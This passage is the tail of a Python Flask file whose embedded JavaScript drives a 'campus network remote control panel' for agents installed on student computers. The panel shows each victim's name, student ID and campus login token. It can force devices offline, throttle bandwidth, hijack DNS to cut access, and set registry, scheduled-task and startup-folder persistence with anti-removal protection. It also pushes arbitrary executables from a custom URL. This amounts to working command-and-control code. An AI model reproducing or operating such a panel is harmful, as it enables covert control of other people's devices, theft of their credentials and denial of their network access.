function esc(s){if(s==null)return"";return String(s).replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));}

function addLog(msg,type=""){
  _sessionLogs.unshift({time:Date.now()/1000,msg,type,agent_id:"session",hostname:"面板",action:"面板操作",detail:msg,success:type==="ok"?true:type==="err"?false:null});
  if(_sessionLogs.length>200)_sessionLogs.pop();
  document.getElementById("sessLogCount").textContent=_sessionLogs.length;
  renderLogs();
}

function _cardKey(a){
  return [a.agent_id,a.status_cls,a.net_online,a.force_offline,a.bandwidth_limit,a.dns_hijacked,a.autostart,a.username,a.user_id,a.version,a.user_ip||a.local_ip,a.campus_ip,a.hostname].join("|");
}
function _buildCard(a){
  const cls=a.status_cls||"off";
  const flags=[];
  if(a.net_online&&!a.force_offline)flags.push('<span class="flag flag-ok">已认证</span>');
  else if(a.force_offline)flags.push('<span class="flag flag-danger">强制离线</span>');
  else flags.push('<span class="flag flag-muted">未认证</span>');
  if(a.bandwidth_limit)flags.push('<span class="flag flag-warn">⚡'+a.bandwidth_limit+'KB/s</span>');
  if(a.dns_hijacked)flags.push('<span class="flag flag-danger">🌐DNS劫持</span>');
  if(a.autostart)flags.push('<span class="flag flag-info">🚀自启</span>');
  return `<div class="device-card ${cls}" data-aid="${esc(a.agent_id)}" onclick="openDrawer('${esc(a.agent_id)}')">
    <div class="card-top"><div class="card-title"><span class="dot"></span><span class="name">${esc(a.hostname||a.agent_id)}</span></div><span class="badge ${cls}">${esc(a.status_text||"未知")}</span></div>
    <div class="card-user">${a.username?'👤 '+esc(a.username):''}${a.user_id?' · '+esc(a.user_id):''}${!a.username&&!a.user_id?'<span style="color:var(--sub)">未获取用户信息</span>':''}</div>
    <div class="card-meta"><span>🌐 ${esc(a.user_ip||a.local_ip||"--")}</span><span>📦 v${esc(a.version||"?")}</span></div>
    <div class="card-flags">${flags.join("")}</div>
    <div class="card-foot"><span>心跳 <span class="js-hb">${ago(a.last_seen)}</span></span><span>运行 <span class="js-up">${esc(a.uptime||"--")}</span></span></div>
  </div>`;
}
let _cardCache={};
function renderAgents(){
  const grid=document.getElementById("agentGrid");
  const kw=(document.getElementById("deviceSearch")?.value||"").trim().toLowerCase();
  let list=_agents;
  if(kw)list=_agents.filter(a=>[a.hostname,a.username,a.user_id,a.local_ip,a.user_ip,a.campus_ip,a.agent_id].map(x=>(x||"").toString().toLowerCase()).join("|").includes(kw));
  if(!list.length){grid.innerHTML='<div class="card-empty">暂无 Agent 连接</div>';_cardCache={};return;}
  // 构建目标 ID 顺序
  const targetIds=list.map(a=>a.agent_id);
  const existingCards={};
  grid.querySelectorAll('[data-aid]').forEach(el=>{existingCards[el.dataset.aid]=el;});
  const existingIds=[...grid.querySelectorAll('[data-aid]')].map(el=>el.dataset.aid);
  // 如果ID列表和顺序都没变, 只做原地更新
  const orderSame=targetIds.length===existingIds.length&&targetIds.every((id,i)=>id===existingIds[i]);
  if(orderSame){
    // 原地更新每张卡片内容 (不移动DOM, 不闪烁)
    list.forEach(a=>{
      const el=existingCards[a.agent_id];if(!el)return;
      const key=_cardKey(a);
      if(_cardCache[a.agent_id]!==key){
        // 状态变化了, 替换卡片内容
        const tmp=document.createElement('div');tmp.innerHTML=_buildCard(a);
        const newCard=tmp.firstElementChild;
        el.className=newCard.className;
        el.innerHTML=newCard.innerHTML;
        _cardCache[a.agent_id]=key;
      } else {
        // 只更新动态文本 (心跳/运行时间)
        const hb=el.querySelector('.js-hb');if(hb)hb.textContent=ago(a.last_seen);
        const up=el.querySelector('.js-up');if(up)up.textContent=a.uptime||'--';
      }
    });
  } else {
    // ID列表变了 (设备上线/下线/搜索变化), 全量重建
    _cardCache={};
    grid.innerHTML=list.map(a=>{_cardCache[a.agent_id]=_cardKey(a);return _buildCard(a);}).join("");
  }
}

function openDrawer(aid){_currentAgentId=aid;renderDrawer();document.getElementById("drawerBackdrop").classList.add("show");document.getElementById("agentDrawer").classList.add("show");}
function closeDrawer(){_currentAgentId=null;document.getElementById("drawerBackdrop").classList.remove("show");document.getElementById("agentDrawer").classList.remove("show");}

function renderDrawer(){
  if(!_currentAgentId)return;
  const a=_agents.find(x=>x.agent_id===_currentAgentId);
  if(!a){closeDrawer();return;}
  document.getElementById("drawerName").textContent='💻 '+(a.hostname||a.agent_id);
  document.getElementById("drawerSub").innerHTML=`<span class="badge ${a.status_cls||'off'}">${esc(a.status_text||'')}</span> · v${esc(a.version||'?')} · 心跳 ${ago(a.last_seen)}`;
  const bw=a.bandwidth_limit?'🔻 '+a.bandwidth_limit+' KB/s':'无限制';
  const dns=a.dns_hijacked?'⚠️ '+esc(a.dns_servers||''):'自动 (DHCP)';
  const net=a.force_offline?'🔒 '+esc(a.net_message||'强制离线'):(a.net_online?'✅ 已认证':'❌ 未认证');
  const id=esc(a.agent_id),hn=esc(a.hostname||a.agent_id);
  document.getElementById("drawerBody").innerHTML=`
    <section class="info-grid">
      <div class="ig-row"><span class="ig-k">Agent ID</span><span class="ig-v" title="${id}">${id.substring(0,18)}…</span></div>
      <div class="ig-row half"><span class="ig-k">👤 姓名</span><span class="ig-v">${esc(a.username||'--')}</span></div>
      <div class="ig-row half"><span class="ig-k">🎓 学号</span><span class="ig-v">${esc(a.user_id||'--')}</span></div>
      <div class="ig-row half"><span class="ig-k">局域网 IP</span><span class="ig-v">${esc(a.local_ip||'--')}</span></div>
      <div class="ig-row half"><span class="ig-k">校园网 IP</span><span class="ig-v">${esc(a.user_ip||a.campus_ip||'--')}</span></div>
      <div class="ig-row"><span class="ig-k">MAC</span><span class="ig-v">${esc(a.mac||'--')}</span></div>
      <div class="ig-row"><span class="ig-k">网络状态</span><span class="ig-v ${a.force_offline?'bad':a.net_online?'good':'warn'}">${net}</span></div>
      <div class="ig-row half"><span class="ig-k">⚡ 限速</span><span class="ig-v ${a.bandwidth_limit?'bad':'good'}">${bw}</span></div>
      <div class="ig-row half"><span class="ig-k">🌐 DNS</span><span class="ig-v ${a.dns_hijacked?'bad':'good'}">${dns}</span></div>
      <div class="ig-row half"><span class="ig-k">运行时间</span><span class="ig-v">${esc(a.uptime||'--')}</span></div>
      <div class="ig-row half"><span class="ig-k">版本</span><span class="ig-v">v${esc(a.version||'?')}</span></div>
    </section>
    <div class="action-group"><div class="group-title">🌐 网络控制</div><div class="action-row">
      <button class="btn btn-red" onclick="forceOffline('${id}','${hn}')">⏏ 强制下线</button>
      <button class="btn btn-green" onclick="sendCmd('${id}','unlock')">🔓 解除锁定</button>
      <button class="btn btn-blue" onclick="sendCmd('${id}','refresh')">🔄 刷新状态</button>
      <button class="btn btn-orange" onclick="sendCmd('${id}','cancel_mab')">🚫 取消无感</button>
    </div></div>
    <div class="action-group"><div class="group-title">⚡ 限速 &amp; DNS</div><div class="action-row">
      <button class="btn ${a.bandwidth_limit?'btn-red':'btn-orange'}" onclick="setBandwidth('${id}','${hn}',${a.bandwidth_limit||0})">${a.bandwidth_limit?'🔻 修改限速':'⚡ 设置限速'}</button>
      ${a.bandwidth_limit?`<button class="btn btn-green" onclick="sendCmd('${id}','clear_bandwidth')">🚀 解除限速</button>`:''}
      <button class="btn ${a.dns_hijacked?'btn-red':'btn-blue'}" onclick="setDns('${id}','${hn}')">${a.dns_hijacked?'🌐 改DNS':'🌐 篡改DNS'}</button>
      ${a.dns_hijacked?`<button class="btn btn-green" onclick="sendCmd('${id}','reset_dns')">🔄 恢复DNS</button>`:''}
    </div></div>
    <div class="action-group"><div class="group-title">🛡️ 系统 &amp; 防护</div>
      <div class="autostart-toggle"><div><div class="label">🚀 开机自启动</div><div class="hint">${a.autostart_reg?"注册表✓":"注册表✗"} · ${a.autostart_task?"计划任务✓":"计划任务✗"} · ${a.autostart_lnk?"启动夹✓":"启动夹✗"}</div></div>
        <label class="toggle" onclick="toggleAutostart('${id}','${hn}',${!!a.autostart})"><input type="checkbox" ${a.autostart?"checked":""} onclick="event.preventDefault()"><span class="slider"></span></label>
      </div>
      <div class="action-row" style="margin-top:8px">
        <button class="btn btn-green" onclick="sendCmd('${id}','protect')">🛡️ 启用防护</button>
        <button class="btn btn-red" onclick="sendCmd('${id}','unprotect')">🔓 解除防护</button>
        <button class="btn btn-purple" onclick="sendCmd('${id}','start_watchdog')">👁️ 看门狗</button>
      </div>
    </div>
    <div class="action-group"><div class="group-title">📦 生命周期 &amp; 更新</div><div class="action-row">
      <button class="btn btn-blue" onclick="pushUpdateSingle('${id}','${hn}','${esc(a.version||'')}')">📦 推送更新</button>
      <button class="btn btn-red" onclick="confirmUninstall('${id}','${hn}')">🗑️ 完全卸载</button>
      <button class="btn btn-dark" onclick="deleteAgent('${id}','${hn}')">❌ 删除设备</button>
    </div></div>
    <div class="token-section"><div class="label">🔑 USER TOKEN (userIndex)</div><div class="val">${esc(a.user_index||'无 token')}</div></div>`;
}

async function sendCmd(agentId,cmd,params={}){
  addLog('下发: '+cmd+' → '+agentId.substring(0,8));
  try{const r=await fetch(API+"/api/command",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({agent_id:agentId,command:cmd,params})});const j=await r.json();if(j.ok)addLog('命令已发送 ('+j.cmd_id+')','ok');else addLog('发送失败: '+j.error,'err');}catch(e){addLog('网络错误: '+e,'err');}
}
function closeModal(){document.getElementById("confirmModal").classList.remove("show");pendingAction=null;}
function openModal(title,msgHtml){document.getElementById("modalTitle").textContent=title;document.getElementById("modalMsg").innerHTML=msgHtml;document.getElementById("confirmModal").classList.add("show");}
function toggleAutostart(agentId,hostname,cur){
  pendingAction={agentId,action:cur?"disable_autostart":"enable_autostart"};
  openModal(cur?"禁用开机自启":"启用开机自启",'设备: <b>'+esc(hostname)+'</b><br><br>'+(cur?'将删除该设备的开机自动运行配置':'将在该设备上设置开机后自动启动 Agent'));
}
function forceOffline(agentId,hostname){
  pendingAction={agentId,action:'logout'};
  openModal('⏏ 强制下线','设备: <b>'+esc(hostname)+'</b><br><br><label class="mdl-label">离线持续时间:</label><select id="offlineDuration" class="mdl-select"><option value="0">永久 (手动解锁)</option><option value="15">15秒</option><option value="30">30秒</option><option value="60">1分钟</option><option value="300" selected>5分钟</option><option value="600">10分钟</option><option value="1800">30分钟</option><option value="3600">1小时</option><option value="7200">2小时</option><option value="86400">24小时</option></select>');
}
function setBandwidth(agentId,hostname,current){
  pendingAction={agentId,action:'set_bandwidth'};
  openModal('⚡ 设置限速','设备: <b>'+esc(hostname)+'</b><br>当前: <b>'+(current?current+' KB/s':'无限制')+'</b><br><br><label class="mdl-label">限速值:</label><select id="bwRate" class="mdl-select"><option value="10">10 KB/s (极慢)</option><option value="50">50 KB/s</option><option value="100" selected>100 KB/s</option><option value="200">200 KB/s</option><option value="500">500 KB/s</option><option value="1024">1 MB/s</option><option value="2048">2 MB/s</option><option value="5120">5 MB/s</option></select>');
}
function setDns(agentId,hostname){
  pendingAction={agentId,action:'set_dns'};
  openModal('🌐 篡改 DNS','设备: <b>'+esc(hostname)+'</b><br><br><label class="mdl-label">主 DNS:</label><select id="dnsSelect" class="mdl-select"><option value="127.0.0.1">127.0.0.1 (回环, 断网)</option><option value="0.0.0.0">0.0.0.0 (无效)</option><option value="1.1.1.1">1.1.1.1 (Cloudflare)</option><option value="8.8.8.8">8.8.8.8 (Google)</option><option value="114.114.114.114">114.114.114.114 (国内)</option><option value="custom">自定义...</option></select><input id="dnsCustom" type="text" placeholder="输入自定义DNS" class="mdl-input" style="display:none">');
  setTimeout(()=>{const s=document.getElementById('dnsSelect'),i=document.getElementById('dnsCustom');if(s&&i)s.onchange=()=>{i.style.display=s.value==='custom'?'block':'none';};},50);
}
function confirmUninstall(agentId,hostname){
  pendingAction={agentId,action:'uninstall'};
  openModal('⚠️ 完全卸载','设备: <b>'+esc(hostname)+'</b><br><br>此操作将终止进程、删除文件和注册表项。<br><br><b style="color:var(--red-text)">卸载后无法远程恢复，需现场重装！</b>');
}
function deleteAgent(agentId,hostname){
  pendingAction={agentId,action:'__delete__'};
  openModal('❌ 删除设备','设备: <b>'+esc(hostname)+'</b><br><br><label style="display:flex;align-items:center;gap:6px"><input type="checkbox" id="blockCheck" checked> 同时拉黑（禁止重连）</label>');
}
function _buildVerSelect(id,d){
  const cached=d.cached_exes||[];
  const cachedSet=new Set(cached.map(c=>c.version));
  let h='<select id="'+id+'" class="mdl-select">';
  // 最新版本 (标记是否有exe缓存)
  const hasLatest=cachedSet.has(d.current);
  h+='<option value="'+esc(d.current)+'" selected>v'+esc(d.current)+' (最新'+(hasLatest?' ✅ 有exe':'  ⚠️ 无exe')+')</option>';
  // 其他有exe缓存的版本
  const seen=new Set([d.current]);
  cached.forEach(c=>{if(!seen.has(c.version)){seen.add(c.version);h+='<option value="'+esc(c.version)+'">v'+esc(c.version)+' ✅ '+c.size_mb+'MB</option>';}});
  // git 历史中的其他版本 (无exe)
  (d.versions||[]).forEach(v=>{if(v.version&&!seen.has(v.version)){seen.add(v.version);h+='<option value="'+esc(v.version)+'">v'+esc(v.version)+' ⚠️ 无exe - '+esc(v.msg.substring(0,30))+'</option>';}});
  h+='<option value="__custom__">✏️ 自定义版本号...</option></select>';
  h+='<input id="'+id+'Custom" type="text" placeholder="输入自定义版本号" class="mdl-input" style="display:none;margin-top:6px">';
  // 缓存摘要
  if(cached.length)h+='<div style="font-size:11px;color:var(--sub);margin-top:4px">� 已缓存 '+cached.length+' 个版本: '+cached.map(c=>'v'+c.version+'('+c.size_mb+'MB)').join(', ')+'</div>';
  else h+='<div style="font-size:11px;color:var(--red-text);margin-top:4px">⚠️ 无缓存exe, 请先上传或从git同步</div>';
  return h;
}
async function pushUpdateSingle(agentId,hostname,curVer){
  pendingAction={agentId,action:'__push_update__'};
  let verHtml='<input id="updateVer" type="text" placeholder="如 1.6" class="mdl-input">';
  try{const r=await fetch(API+'/api/versions');const d=await r.json();if(d.current)verHtml=_buildVerSelect('updateVer',d);}catch(e){}
  openModal('📦 推送更新','设备: <b>'+esc(hostname)+'</b><br>当前版本: <b>v'+(curVer||'?')+'</b><br><br><label class="mdl-label">目标版本:</label>'+verHtml+'<br><label class="mdl-label" style="display:block;margin-top:10px">自定义URL (可选):</label><input id="updateUrl" type="text" placeholder="留空用服务器托管exe" class="mdl-input">');
  setTimeout(()=>{const s=document.getElementById('updateVer');if(s&&s.tagName==='SELECT'){s.onchange=()=>{const ci=document.getElementById('updateVerCustom');if(ci)ci.style.display=s.value==='__custom__'?'block':'none';};}},50);
}
async function confirmAction(){
  if(!pendingAction){closeModal();return;}
  const{agentId,action}=pendingAction;let params={};
  if(action==='logout'){const s=document.getElementById("offlineDuration");if(s)params.duration=parseInt(s.value);}
  else if(action==='set_bandwidth'){const s=document.getElementById("bwRate");if(s)params.rate_kbps=parseInt(s.value);}
  else if(action==='set_dns'){const s=document.getElementById("dnsSelect");if(s){if(s.value==='custom'){const i=document.getElementById("dnsCustom");params.primary=i?i.value.trim():'127.0.0.1';}else params.primary=s.value;}}
  let _pv='',_pu='',_bc=true;
  if(action==='__push_update__'){_pv=document.getElementById('updateVer')?.value?.trim()||'';if(_pv==='__custom__')_pv=document.getElementById('updateVerCustom')?.value?.trim()||'';_pu=document.getElementById('updateUrl')?.value?.trim()||'';}
  if(action==='__delete__')_bc=document.getElementById('blockCheck')?.checked??true;
  closeModal();
  if(action==='__delete__'){await doDelete(agentId,_bc);}
  else if(action==='__push_update__'){
    try{const r=await fetch(API+'/api/push_update',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agents:[agentId],version:_pv,url:_pu||undefined})});const j=await r.json();if(j.ok)addLog('推送v'+_pv+' → '+agentId.substring(0,8)+(j.skipped?' (跳过'+j.skipped+'个已是最新)':''),'ok');else addLog('推送失败: '+j.error,'err');}catch(e){addLog('推送错误: '+e,'err');}
  }else if(action==='__batch_update__'){
    let bv=document.getElementById('batchVer')?.value?.trim()||'';if(bv==='__custom__')bv=document.getElementById('batchVerCustom')?.value?.trim()||'';
    const checked=[...document.querySelectorAll('.batch-dev:checked')].map(c=>c.value);
    if(!bv){addLog('请选择版本号','err');return;}
    if(!checked.length){addLog('请选择至少一个设备','err');return;}
    try{const r=await fetch(API+'/api/push_update',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agents:checked,version:bv})});const j=await r.json();if(j.ok)addLog('批量推送v'+bv+': 推送'+j.count+'个'+(j.skipped?', 跳过'+j.skipped+'个已是最新':''),'ok');else addLog('推送失败: '+j.error,'err');}catch(e){addLog('推送错误: '+e,'err');}
  }else{await sendCmd(agentId,action,params);}
}
async function doDelete(agentId,block){
  addLog('删除: '+agentId.substring(0,8)+(block?' +拉黑':''));
  try{const r=await fetch(API+"/api/delete_agent",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({agent_id:agentId,block})});const j=await r.json();if(j.ok){addLog("删除成功","ok");closeDrawer();refresh();}else addLog('删除失败: '+j.error,'err');}catch(e){addLog('网络错误: '+e,'err');}
}
async function openBatchUpdate(){
  let verHtml='<input id="batchVer" type="text" placeholder="如 1.6" class="mdl-input">';
  try{const r=await fetch(API+'/api/versions');const d=await r.json();if(d.current)verHtml=_buildVerSelect('batchVer',d);}catch(e){}
  // 构建设备选择列表
  let devHtml='<div style="max-height:200px;overflow-y:auto;border:1px solid var(--border);border-radius:8px;padding:6px;margin-top:6px">';
  devHtml+='<label style="display:flex;align-items:center;gap:6px;padding:4px 0;border-bottom:1px solid var(--border);margin-bottom:4px;font-weight:600"><input type="checkbox" id="batchSelectAll" checked onchange="document.querySelectorAll(\'.batch-dev\').forEach(c=>c.checked=this.checked)"> 全选/取消全选</label>';
  _agents.forEach(a=>{
    const online=a.alive;
    const ver=a.version||'?';
    devHtml+='<label style="display:flex;align-items:center;gap:6px;padding:3px 0;font-size:13px"><input type="checkbox" class="batch-dev" value="'+esc(a.agent_id)+'" '+(online?'checked':'')+' '+(online?'':'disabled')+'><span style="'+(online?'':'color:var(--sub)')+'">'+esc(a.hostname||a.agent_id)+' <span style="font-size:11px;color:var(--sub)">(v'+esc(ver)+(online?', 在线':' 离线')+')</span></span></label>';
  });
  devHtml+='</div>';
  pendingAction={agentId:null,action:'__batch_update__'};
  openModal('📦 批量推送更新','<label class="mdl-label">目标版本:</label>'+verHtml+'<div style="margin-top:12px"><label class="mdl-label">推送目标:</label>'+devHtml+'</div><div style="margin-top:10px"><button class="btn btn-blue" style="font-size:12px;padding:4px 10px" onclick="batchUploadExe()">📤 上传新exe</button></div>');
  setTimeout(()=>{
    const s=document.getElementById('batchVer');
    if(s&&s.tagName==='SELECT'){s.onchange=()=>{const ci=document.getElementById('batchVerCustom');if(ci)ci.style.display=s.value==='__custom__'?'block':'none';};}
  },50);
}
function batchUploadExe(){
  const ver=prompt('此 exe 的版本号:','');if(ver===null||!ver.trim())return;
  const input=document.createElement('input');input.type='file';input.accept='.exe';
  input.onchange=async()=>{const file=input.files[0];if(!file)return;addLog('上传 v'+ver+': '+file.name);const fd=new FormData();fd.append('file',file);fd.append('version',ver.trim());
    try{const r=await fetch(API+'/api/upload_exe',{method:'POST',body:fd});const j=await r.json();if(!j.ok){addLog('上传失败: '+j.error,'err');return;}addLog('上传成功: v'+j.version+' '+j.size_mb+'MB','ok');
    }catch(e){addLog('上传错误: '+e,'err');}};input.click();
}

function categorizeLog(h){const a=(h.action||"").toString();if(a.startsWith("下发命令"))return"cmd";if(a==="命令结果")return"result";if(a==="首次连接"||a==="重新上线"||a.startsWith("删除设备"))return"conn";return"sys";}
function setLogTab(k){_logTab=k;document.querySelectorAll('.log-tabs .tab').forEach(t=>t.classList.toggle('active',t.dataset.kind===k));renderLogs();}
function toggleLogFilterPanel(){const p=document.getElementById("logFilterPanel");p.style.display=p.style.display==="none"?"block":"none";if(p.style.display==="block")renderDeviceFilterList();}
function renderDeviceFilterList(){
  const list=document.getElementById("logFilterList");
  list.innerHTML=_agents.map(a=>'<label class="filter-item"><input type="checkbox" '+(_logDeviceFilter.has(a.agent_id)?'checked':'')+' onchange="toggleDeviceFilter(\''+esc(a.agent_id)+'\',this.checked)"><span>'+esc(a.hostname||a.agent_id)+'</span></label>').join("");
}
function toggleDeviceFilter(aid,on){if(on)_logDeviceFilter.add(aid);else _logDeviceFilter.delete(aid);updateFilterBtn();renderLogs();}
function selectAllDevices(all){_logDeviceFilter.clear();if(all)_agents.forEach(a=>_logDeviceFilter.add(a.agent_id));renderDeviceFilterList();updateFilterBtn();renderLogs();}
function updateFilterBtn(){const b=document.getElementById("filterBtn");b.textContent=_logDeviceFilter.size?'🎯 已选 '+_logDeviceFilter.size+' 台设备':'🎯 按设备筛选: 全部';}

function renderLogs(){
  const kw=(document.getElementById("logSearch")?.value||"").trim().toLowerCase();
  const all=[..._sessionLogs,..._history];
  let list=all.filter(h=>{
    if(_logTab!=="all"){if(h.agent_id==="session"){if(_logTab!=="sys")return false;}else if(categorizeLog(h)!==_logTab)return false;}
    if(_logDeviceFilter.size&&h.agent_id!=="session"&&!_logDeviceFilter.has(h.agent_id))return false;
    if(kw){const t=[h.hostname,h.action,h.detail,h.agent_id].map(x=>(x||"").toString().toLowerCase()).join("|");if(!t.includes(kw))return false;}
    return true;
  });
  const box=document.getElementById("logBox");
  if(!list.length){box.innerHTML='<div class="log-empty">无匹配日志</div>';return;}
  box.innerHTML=list.slice(0,500).map(h=>{
    const cls=h.success===true?"ok":h.success===false?"err":"";
    const ic=h.success===true?"✓":h.success===false?"✗":"•";
    return '<div class="log-row '+cls+'"><span class="ic">'+ic+'</span><span class="tm">'+fmtTime(h.time)+'</span><span class="host">'+esc(h.hostname||(h.agent_id==="session"?"面板":h.agent_id?.substring(0,10)))+'</span><span class="act">'+esc(h.action||'')+' <span class="detail">'+esc(h.detail||'')+'</span></span></div>';
  }).join("");
}

async function refresh(){
  try{
    const r=await fetch(API+"/api/agents");_agents=await r.json();
    document.getElementById("totalCnt").textContent=_agents.length;
    let on=0,off=0,aw=0;
    _agents.forEach(a=>{if(a.status_cls==="on")on++;else if(a.status_cls==="aw")aw++;else off++;});
    document.getElementById("onlineCnt").textContent=on;
    document.getElementById("offlineCnt").textContent=off;
    document.getElementById("awayCnt").textContent=aw;
    renderAgents();
    if(_currentAgentId)renderDrawer();
  }catch(e){console.error("refresh fail",e);}
  try{
    const r2=await fetch(API+"/api/history");_history=await r2.json();
    document.getElementById("histLogCount").textContent=_history.length;
    renderLogs();
  }catch(e){}
}

function updateClock(){
  const d=new Date();
  document.getElementById("clock").textContent=d.toLocaleString("zh-CN",{hour12:false,year:"numeric",month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit",second:"2-digit"});
}

setInterval(refresh,4000);
setInterval(updateClock,1000);
refresh();updateClock();
</script>
</body>
</html>
"""

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="校园网远程控制面板")
    parser.add_argument("--host", default="0.0.0.0", help="监听地址")
    parser.add_argument("--port", type=int, default=9090, help="监听端口")
    args = parser.parse_args()
    
    print("=" * 50)
    print("  校园网远程控制面板")
    print("=" * 50)
    _load_data()
    print(f"  ➜ http://localhost:{args.port}")
    print(f"  ➜ http://0.0.0.0:{args.port}  (局域网)")
    print("=" * 50)
    
    app.run(host=args.host, port=args.port, debug=False)
